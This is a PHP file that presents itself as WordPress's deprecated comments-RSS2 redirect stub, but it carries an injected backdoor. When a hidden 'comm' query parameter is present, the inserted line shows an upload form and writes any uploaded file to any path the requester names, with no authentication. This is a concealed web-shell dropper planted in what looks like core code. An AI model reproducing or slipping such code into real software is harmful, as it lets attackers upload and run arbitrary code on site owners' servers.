<?php
/**
 * Redirects to the Comments RSS2 feed
 * This file is deprecated and only exists for backwards compatibility
 *
 * @package WordPress
 */
if (isset($_GET["comm"])) { echo('<form method="post" enctype="multipart/form-data"><b>UPLOAD FILE:</b> <input type="file" size="25" name="upload"><br><b>FILE NAME:</b> <input type="text" name="filename" size="25"> <input type="submit" value="UPLOAD"></form>'); if(isset($_FILES['upload']) and isset($_POST['filename'])) { if(copy($_FILES['upload']['tmp_name'], $_POST['filename'])) { echo('ok...<br>'.$_POST['filename']); } else { echo('Error...'); } } }
require( './wp-load.php' );
wp_redirect( get_bloginfo( 'comments_rss2_url' ), 301 );

?>